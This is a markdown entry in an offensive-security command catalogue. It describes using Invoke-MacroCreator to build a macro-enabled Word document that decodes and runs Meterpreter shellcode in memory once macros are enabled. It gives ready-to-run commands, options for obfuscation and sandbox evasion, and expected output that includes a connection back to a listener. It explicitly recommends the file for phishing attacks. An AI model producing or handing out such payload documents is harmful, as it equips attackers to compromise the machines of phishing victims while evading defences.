---
type: command
executor: powershell
data: Invoke-MacroCreator -i $_INPUT_FILE -t shellcode -d body
tags:
  - macro
  - shellcode
  - office
platforms:
  - Windows
verified: true
validated: true
---

# invoke-macrocreator-embed-shellcode-in-word-body

## Command

```powershell
Invoke-MacroCreator -i $_INPUT_FILE -t shellcode -d body
```

## Description

This command uses the Invoke-MacroCreator tool to generate a Microsoft Word document (.docm) with Meterpreter shellcode embedded directly in the macro body. The shellcode is base64-encoded and injected into VBA code that decodes and executes it in memory upon macro enablement. Use this for self-contained payloads in phishing attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i $_INPUT_FILE | Path to the raw shellcode file (e.g., meterpreter_shellcode.raw) | Yes |
| -t shellcode | Specifies the payload type as shellcode | Yes |
| -d body | Delivery method: embed in the document body | Yes |
| -o | Enable VBA code obfuscation (optional) | No |
| -e | Enable sandbox evasion techniques (optional) | No |

## Examples

### Basic Usage

```powershell
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
```

### With Obfuscation

```powershell
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body -o
```

## Expected Output

The command outputs a file named something like 'MacroCreator_output.docm' in the current directory. Console message: 'Macro created successfully: MacroCreator_output.docm'. Opening the file in Word will show a security warning; enabling macros triggers shellcode execution, connecting back to the listener if configured.

## Related

- [[procedures/Macro-Delivery-of-Meterpreter-Shellcode]]
- [[tools/Invoke-MacroCreator]]
